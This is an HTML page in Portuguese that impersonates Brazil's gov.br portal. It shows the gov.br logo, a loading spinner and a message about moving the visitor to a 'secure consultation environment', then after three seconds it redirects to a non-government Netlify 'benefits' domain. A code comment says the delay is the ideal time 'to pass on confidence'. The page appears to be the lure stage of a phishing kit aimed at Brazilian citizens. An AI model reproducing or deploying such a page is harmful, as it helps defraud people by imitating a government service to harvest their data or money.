<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>gvbr - Redirecionamento</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;600;700&display=swap');
        body { font-family: 'Public Sans', sans-serif; background-color: #fff; margin: 0; }
        
        .container-simple {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            padding: 20px;
            text-align: center;
        }

        .loader-gov {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1351b4;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .btn-manual {
            margin-top: 30px;
            color: #1351b4;
            font-size: 14px;
            text-decoration: underline;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="container-simple">
        <img src="govbr.png" style="height: 50px; margin-bottom: 40px;" alt="gov.br">

        <div class="loader-gov"></div>

        <h1 class="text-[#333] text-[20px] font-bold mb-2">Aguarde um momento</h1>
        <p class="text-[#666] text-[16px] max-w-[300px]">Estamos redirecionando você para o <strong>Ambiente Seguro de Consulta</strong>.</p>

        <p class="text-[#888] text-[12px] mt-10">Você será transferido automaticamente em instantes...</p>
        
        <a href="consulta.html" class="btn-manual">Clique aqui se não for redirecionado</a>
    </div>

    <script>
        // Redireciona após 3 segundos (tempo ideal para passar confiança)
        setTimeout(function() {
            window.location.href = "https://beneficiosgocv.netlify.app/"; 
        }, 3000);
    </script>

</body>
</html>
